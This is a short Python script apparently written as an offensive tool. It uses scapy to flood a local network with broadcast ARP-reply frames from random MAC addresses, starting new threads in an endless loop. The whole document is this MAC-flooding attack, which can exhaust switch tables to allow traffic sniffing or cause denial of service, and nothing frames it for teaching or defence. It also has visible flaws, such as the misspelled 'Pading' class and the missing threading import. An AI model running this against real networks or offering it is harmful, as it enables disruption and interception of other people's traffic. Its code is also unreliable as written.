#!/usr/bin/env python
#author Aiden

from scapy.all import *

class macflood(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)
	def run(self):
		e = Ether()
		e.src = RandMAC()
		e.dst="FF:FF:FF:FF:FF:FF"

		a = ARP()
		a.op=2 
		a.psrc="0.0.0.0"
		a.hwdst="FF:FF:FF:FF:FF:FF"

		data = "A" * 18

		sendp(e/a/Pading(data))
while True:
	macflood().start()
   
